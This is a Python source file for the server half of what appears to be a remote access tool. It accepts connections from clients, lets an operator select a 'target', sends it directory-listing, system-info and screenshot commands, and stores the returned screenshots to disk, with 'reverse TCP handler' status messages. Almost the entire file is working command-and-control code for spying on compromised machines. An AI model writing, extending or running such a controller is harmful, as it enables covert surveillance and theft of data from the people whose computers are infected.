try:
    import socket
    import threading
    import os
    from colorama import Back, Style, Fore
    import datetime
    import shutil
    from io import BytesIO

except ImportError as missing_module:
    print(f"[*] Error while importing modules : {missing_module}")

class ServerShell:
    def __init__(self):
        self.SERVER_IP = "127.0.0.1"
        self.SERVER_PORT = 5050
        self.CLIENT_LIST = {}
        self.TARGET_CLIENT = None
        self.waiting_for_screenshot = False  # Flag to indicate if we are waiting for screenshot data


    def handleServerClient(self, client_socket, client_addr):
        print(f"[+] Accepted connection from: {client_addr}")
        while True:
            try:
                serverData = client_socket.recv(4096)
                if not serverData:
                    break

                # Check if we are waiting for screenshot data
                if self.waiting_for_screenshot:
                    self.handleBinaryData(client_socket, serverData)
                    self.waiting_for_screenshot = False  # Reset the flag after handling screenshot data
                else:
                    try:
                        serverCommand = serverData.decode('utf-8').strip()

                        # Process the text command
                        self.handleCommandDisplaying(serverCommand)
                    except UnicodeDecodeError:
                        # If decoding fails, assume it's binary data (e.g., screenshot)
                        self.waiting_for_screenshot = True  # Set the flag to indicate we are waiting for screenshot data
                        self.handleBinaryData(client_socket, serverData)

            except Exception as e:
                print(e)
                break

        print("Disconnected")
        client_socket.close()
        del self.CLIENT_LIST[client_addr]


    def handleBinaryData(self, client_socket, binary_data):
        try:
            # Process the binary data (e.g., save the screenshot to a file)
            screenshot_data_size = int.from_bytes(binary_data[:4], 'big')
            screenshot_data = binary_data[4:]

            # Keep receiving until we get all the screenshot data
            while len(screenshot_data) < screenshot_data_size:
                data_chunk = client_socket.recv(4096)
                if not data_chunk:
                    print("Error: Incomplete screenshot data received.")
                    return
                screenshot_data += data_chunk

            # Verify if we received the complete screenshot data
            if len(screenshot_data) != screenshot_data_size:
                print("Error: Incomplete screenshot data received.")
                return

            # Create the "temp" folder if it doesn't exist
            if not os.path.exists("temp"):
                os.makedirs("temp")

            # Create the "temp/screenshot" folder if it doesn't exist
            folder_path = os.path.join("temp", "screenshot")
            if not os.path.exists(folder_path):
                os.makedirs(folder_path)

            # Generate the file name with the current date and time
            now = datetime.datetime.now()
            file_name = "screenshot_" + now.strftime("%Y-%m-%d_%H-%M-%S") + ".png"
            file_path = os.path.join(folder_path, file_name)

            # Save the screenshot data as PNG with the generated file name
            with open(file_path, "wb") as file:
                shutil.copyfileobj(BytesIO(screenshot_data), file)

            print(f"Screenshot saved as '{file_path}'")

            # Display the "Saved" message
            print("Saved")

        except Exception as e:
            print(f"Error receiving binary data: {e}")


    def handleCommandDisplaying(self, incoming_str):
        print("\n")
        print(incoming_str)
        print("\n")

    def handleServerCommands(self):
        while True:
            if self.TARGET_CLIENT:
                serverShellCommand = input(f"> {Fore.RED}sh{Style.RESET_ALL}@{Fore.RED}127.0.0.1{Style.RESET_ALL} {Fore.BLUE}~{Style.RESET_ALL} [{Fore.YELLOW}{self.TARGET_CLIENT}{Style.RESET_ALL}] {Fore.GREEN}${Style.RESET_ALL} ")
            else:
                serverShellCommand = input(f"> {Fore.RED}sh{Style.RESET_ALL}@{Fore.RED}127.0.0.1{Style.RESET_ALL} ~ {Fore.GREEN}${Style.RESET_ALL} ")

            if not serverShellCommand:
                continue

            if serverShellCommand == "Hello":
                self.Hello()
            elif serverShellCommand == "clear":
                self.handleClearCommand()
            elif serverShellCommand == "list":
                self.handleListCommand()
            elif serverShellCommand.startswith("target "):
                self.handleTargetCommand(serverShellCommand[7:].strip())
            elif serverShellCommand == "stoptarget":
                self.TARGET_CLIENT = None
            elif serverShellCommand == "ls":
                self.handleListdirCommand()
            elif serverShellCommand == "get_info -sys":
                self.handleGetInfoSysCommand()
            elif serverShellCommand == "screenshot":
                self.handleScreenshotCommand()
            else:
                print("Invalid")

    def handleScreenshotCommand(self):
        if not self.TARGET_CLIENT:
            print("No client selected. Use 'target' command to select a client.")
            return

        try:
            selected_ip, selected_port = self.TARGET_CLIENT.split(":")
            selected_port = int(selected_port)
            if (selected_ip, selected_port) not in self.CLIENT_LIST:
                print("Selected client is not connected.")
                return

            selected_socket, _ = self.CLIENT_LIST[(selected_ip, selected_port)]
            selected_socket.send("screenshot".encode("utf-8"))

            # Set the flag to indicate that we are waiting for the screenshot data
            self.waiting_for_screenshot = True

        except Exception as e:
            print(f"Error receiving screenshot: {e}")


    def handleGetInfoSysCommand(self):
        SendToClient = "get_info -sys"

        if self.TARGET_CLIENT:
            try:
                selected_ip, selected_port = self.TARGET_CLIENT.split(":")
                selected_port = int(selected_port)
                if(selected_ip, selected_port) in self.CLIENT_LIST:
                    selected_socket, _ = self.CLIENT_LIST[(selected_ip, selected_port)]
                    selected_socket.send(SendToClient.encode('utf-8'))
                    return
                else:
                    print("This client is not alive")
            except Exception as e:
                print(f"Error sending command {e}")         

    def handleListdirCommand(self):
        SendToClient = "ls"

        if self.TARGET_CLIENT:
            try:
                selected_ip, selected_port = self.TARGET_CLIENT.split(":")
                selected_port = int(selected_port)
                if(selected_ip, selected_port) in self.CLIENT_LIST:
                    selected_socket, _ = self.CLIENT_LIST[(selected_ip, selected_port)]
                    selected_socket.send(SendToClient.encode('utf-8'))
                    return
                else:
                    print("This client is not alive")
            except Exception as e:
                print(f"Error sending command {e}")
            
    def handleTargetCommand(self, client_str):
        if client_str in [f"{addr[0]}:{addr[1]}" for addr in self.CLIENT_LIST.keys()]:
            self.TARGET_CLIENT = client_str
            self.handleClearCommand()
            print("")
            print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Started reverse TCP handler on {self.TARGET_CLIENT}")
            print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Server Started.")
            print("")
        else:
            print(f"[{Fore.RED}-{Style.RESET_ALL}] Client not found.")

    def handleClearCommand(self):
        if os.name == "nt":
            os.system('cls')
        else:
            os.system('clear')

    def handleListCommand(self):
        if len(self.CLIENT_LIST) == 0:
            print("")
            print(f"[{Fore.RED}*{Style.RESET_ALL}] 0 clients are connected.")
            print("")
        else:
            print("")
            print(f"[{Fore.GREEN}*{Style.RESET_ALL}] {len(self.CLIENT_LIST)} Connected clients.")
            for client_addr, (client_socket) in self.CLIENT_LIST.items():
                print(f"{client_addr[0]} - {client_addr[1]}")
            print("")

    def Hello(self):
        SendToClient = "Hello World !"

        if self.TARGET_CLIENT:
            try:
                selected_ip, selected_port = self.TARGET_CLIENT.split(":")
                selected_port = int(selected_port)
                if(selected_ip, selected_port) in self.CLIENT_LIST:
                    selected_socket, _ = self.CLIENT_LIST[(selected_ip, selected_port)]
                    selected_socket.send(SendToClient.encode('utf-8'))
                    return
                else:
                    print("This client is not alive")
            except Exception as e:
                print(f"Error sending command {e}")

        for client_addr, (client_socket, _) in self.CLIENT_LIST.items():
            client_socket.send(SendToClient.encode('utf-8'))

    def initializeServerShell(self):
        serverShellConfig = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serverShellConfig.bind((self.SERVER_IP, self.SERVER_PORT))
        serverShellConfig.listen()
        print(f"[*] Listening on {self.SERVER_IP}:{self.SERVER_PORT}")

        serverHandlerThreads = threading.Thread(target=self.handleServerCommands)
        serverHandlerThreads.start()

        while True:
            client_socket, client_addr = serverShellConfig.accept()

            self.CLIENT_LIST[client_addr] = (client_socket, None)

            clientHandlerThreads = threading.Thread(target=self.handleServerClient, args=(client_socket, client_addr))
            clientHandlerThreads.start()

if __name__ == "__main__":
    serverShell = ServerShell()
    serverShell.initializeServerShell()